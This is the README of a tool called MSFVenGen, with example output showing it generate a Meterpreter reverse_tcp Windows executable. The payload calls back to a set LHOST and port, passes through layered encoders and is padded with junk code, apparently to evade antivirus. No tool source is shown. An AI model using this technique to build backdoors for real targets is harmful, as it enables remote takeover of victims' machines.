# MSFVenGen

MSFVenGen - Custom MSFVenom Executable Generator

### Requirements

- Linux
- Wine + MinGW
- Metasploit Framework

### Usage

    ./msfvengen.sh

### Example output
    MSFVenGen - Custom MSFVenom Executable Generator
    > LHOST: 192.168.0.102
    > LPORT: 4444
    We will be using the windows/meterpreter/reverse_X payloads. Which would you like to use?
    > windows/meterpreter/reverse_tcp
    > How many cycles we encode our shellcode? 1
    > Number of random seed to add some junk to the resulting C code source file: 1
    
    Cleaning out the ShellCode directory
    Generating shellcode...
    Attempting to read payload from STDIN...
    Attempting to read payload from STDIN...
    Attempting to read payload from STDIN...
    Attempting to read payload from STDIN...
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of generic/none
    generic/none succeeded with size 333 (iteration=0)
    generic/none chosen with final size 333
    Payload size: 333 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 360 (iteration=0)
    x86/shikata_ga_nai chosen with final size 360
    Payload size: 360 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/jmp_call_additive
    x86/jmp_call_additive succeeded with size 389 (iteration=0)
    x86/jmp_call_additive chosen with final size 389
    Payload size: 389 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/call4_dword_xor
    x86/call4_dword_xor succeeded with size 416 (iteration=0)
    x86/call4_dword_xor chosen with final size 416
    Payload size: 416 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 443 (iteration=0)
    x86/shikata_ga_nai chosen with final size 443
    Payload size: 443 bytes
    Final size of c file: 1886 bytes
    Saved as: /home/lonalore/msfvengen/ShellCode/test.c
    Shellcode generated.
    Cleaning it up...
    Creating Headers...
    Creating the first bit of fluff
    Creating the execution bit...
    Creating the last bit of fluff...
    Merging the last of it together...
    tcp-4444-826.exe SHA-1 Checksum is .. 088a3b485993622d450b534cead0ff5aa1701524 tcp-4444-826.exe
    
    Done!
